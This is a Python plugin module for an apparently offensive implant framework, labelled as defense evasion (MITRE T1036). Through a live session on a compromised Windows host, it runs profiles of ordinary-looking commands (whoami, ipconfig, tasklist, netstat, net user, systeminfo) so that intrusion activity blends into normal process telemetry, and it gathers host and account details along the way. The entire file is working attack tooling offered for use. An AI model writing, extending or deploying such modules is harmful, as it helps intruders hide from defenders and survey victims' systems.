"""defense_evasion/behavior_mimicry — mimic legitimate process behavior via implant exec. MITRE T1036"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class BehaviorMimicry(BasePlugin):
    NAME        = "behavior_mimicry"
    DESCRIPTION = "Spawn benign-looking child processes to blend into normal process telemetry."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1036"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("profile", str, required=False, default="office",
              help="Behavior profile: office | browser | sysadmin"),
    )

    _PROFILES = {
        "office":   ["cmd /c whoami", "cmd /c ipconfig /all", "cmd /c tasklist"],
        "browser":  ["cmd /c netstat -an", "cmd /c nslookup google.com"],
        "sysadmin": ["cmd /c net user", "cmd /c systeminfo"],
    }

    @mitre("T1036")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        profile  = params.get("profile", "office").lower()
        commands = self._PROFILES.get(profile, self._PROFILES["office"])
        outputs  = []
        for cmd in commands:
            r = ctx.exec(cmd)
            outputs.append(f"[{cmd}] {r.get('output','')[:80]}")
        return ModuleResult.ok(data="\n".join(outputs))
